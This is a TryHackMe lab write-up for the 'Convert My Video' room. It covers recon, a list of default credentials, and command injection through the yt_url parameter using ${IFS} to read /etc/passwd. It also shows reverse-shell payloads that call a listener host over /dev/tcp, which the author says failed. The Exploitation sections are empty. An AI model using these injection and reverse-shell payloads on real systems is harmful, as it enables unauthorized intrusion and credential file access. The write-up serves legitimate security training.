---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-01T11:11:05.341+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
---

![](/img/user/Attachments/redteaming2.png)

--------
## Description


---------
## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap1%202.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/nmap2%202.png)



![](/img/user/Attachments/homepage%204.png)

A simple homepage. Given the context in the room this is most likely the place for the attack vector. 

-------
## Enumeration

![](/img/user/Attachments/gobuster%201.png)

Gobuster found several and many other 401-endpoints. Sadly they are not accessible without login credentials. 

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.113.161.179  
-t 40 -o dirs.out -b 403-500
```


![](/img/user/Attachments/admin-creds-popup.png)

Visiting **/admin** shows the web app is using HTTP Auth. No credentials found yet. Maybe default credentials work? Or maybe hydra can come to the rescue. 

```bash

# default creds tried - no luck

admin:admin
admin:password
admin:1234567
administrator:admin
administrator:password
administrator:123456
root:toor
```

----
### Looking at the homepage


So, opening **DevTools** and inspecting the code shown in the **main.js** file reveals how the web app handles converting videos to downloadable MP3-files given a youtube link. 

**Main.js** 
```js
$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

Looking at the javascript code there is a base url for youtube with a watch parameter. This could open the possiblity for command injection. 

### Using Burp Suite for Command Injection Enumeration

![](/img/user/Attachments/idfound.png)

Intercepting the request on the frontpage and entering a random value to capture it. This is possibly the intended attack path. Initially simply entering various commands didnt work neither did URL-encoding or Base64-encoding it. For some reason a semicolon ; works 

**Rough output from Burp Suite**
![](/img/user/Attachments/etc-passwd.png)

**Formatted Output**
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash
```

```bash
cat${IFS}/etc/passwd
```


So the output reveals a **dmv** user.  And it also confirms bash is on the system. Entering multiple words doesn't work as burp cannot process it as a single command. Furthermore URL or base64 encoding doesnt work either. Bash luckily has a syntax for this which can solve the issue.

**Breakdown of Internal Field Separator**
The ${IFS} is *Internal Field *Separator* aka a syntax in bash allowing to specify a white space character. Since simply writing a command with more than 1 word doesn't work for this payload approach. 


```bash
yt_url=;which${IFS}python3${IFS}python${IFS}perl${IFS}php${IFS}nc${IFS}netcat${IFS}socat${IFS}bash${IFS}sh${IFS}curl${IFS}wget;
```

Let's check for available tools. 

```bash
/usr/bin/python3
/usr/bin/python
/usr/bin/perl
/usr/bin/php
/bin/nc
/bin/netcat
/bin/bash
/bin/sh
/usr/bin/curl
/usr/bin/wget
```

So there are plenty tools available. Perhaps it is possible to spawn a reverse shell. Also worth noting that the commands are being executed from **/var/www/html** perhaps a second approach would be writing a script to the directory and executing it.

**Testing for Reverse Shell with nc**
```
# initial payload
bash -i >& /dev/tcp/IP/4444 0>&1

# Inserting IFS
bash${IFS}-i${IFS}>&${IFS}/dev/tcp/192.168.141.140/4444${IFS}0>&1

# URL-encoding ampersand
bash${IFS}-i${IFS}>%26${IFS}/dev/tcp/192.168.141.140/4444${IFS}0>%261

Once again, burp cannot process & as a part of the command. It treats it as a new parameter. Thus url-encoding the character is required.

```

This did not yield a connection to the nc listener. 


-----
## Exploitation



----
## Post-exploitation


------
## Attack Pattern Analysis (APA)